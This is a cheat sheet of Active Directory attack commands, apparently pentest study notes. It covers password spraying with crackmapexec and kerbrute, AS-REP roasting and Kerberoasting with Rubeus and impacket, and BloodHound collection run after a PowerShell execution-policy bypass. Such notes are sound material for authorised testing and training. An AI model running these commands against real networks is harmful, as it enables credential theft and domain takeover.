
### Password Spraying
#### Check Policy
```
crackmapexec <ip> -u <user> -p <password> --pass-pol
enum4linux -u <user> -p <pass> -P <ip>
net accounts
```
#### Spray
```
#Windows
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

#Linux
crackmapexec smb <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
crackmapexec smb <target_ips> -u <user_list> -H <hash> -d <domain> --continue-on-success
crackmapexec winrm <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
crackmapexec rdp <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success

#DON'T FORGET TO USE --local-auth to try local password spray.
#Don't FORGET TO CHECK THE SHARES AS WELL.
```
#### AS-REP Roasting
```
#Gets all users.
impacket-GetADUsers -all -dc-ip <dc_ip> <domain>/<username>

#Roasting
.\Rubeus.exe asreproast /nowrap
impacket-GetNPUsers <domain>/ -usersfile <usernames.txt> - format hashcat -outputfile hashes-asrep
impacket-GetNPUsers <domain_name>/<domain_user> -request -format hashcat -outputfile hashes-asrep -dc-ip <ip>
```
#### Kerberoasting
```
#Roasting
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
impacket-GetUserSPNs <domain_name>/<domain_user> -outputfile hashes-kerb -dc-ip <ip>
```

### BloodHound
#### Data collection
```
powershell -ep bypass
Import-Module .\sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\<user>\Desktop\ -OutputPrefix "audit results"
```
#### Data Analysis

```
sudo neo4j start
sudo bloodhound
http://localhost:7474 (neo4j:kali)
```
- Import zipped data.
- Check Shortest Paths Analysis.
- Right click objects that are owned. For example users and client machines.
- Then choose "Shortest Path to Domain Admins from owned Principals".